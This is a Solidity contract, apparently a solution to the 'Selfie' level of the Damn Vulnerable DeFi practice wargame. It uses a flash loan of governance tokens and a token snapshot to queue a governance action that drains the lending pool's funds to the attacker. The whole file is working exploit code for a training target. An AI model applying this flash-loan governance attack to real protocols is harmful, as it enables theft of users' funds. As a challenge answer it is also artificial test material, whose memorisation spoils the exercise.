//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    address payable owner;
    SelfiePool pool;
    DamnValuableTokenSnapshot DVT;

    constructor(
        address payable _owner,
        address _pool,
        address _token
    ) {
        owner = _owner;
        pool = SelfiePool(_pool);
        DVT = DamnValuableTokenSnapshot(_token);
    }

    function attack(uint256 amount) external {
        require(msg.sender == owner);
        pool.flashLoan(amount);
    }

    function receiveTokens(address _addressToken, uint256 _amount) external {
        DVT.snapshot();
        pool.governance().queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        DVT.transfer(address(pool), _amount);
    }
}
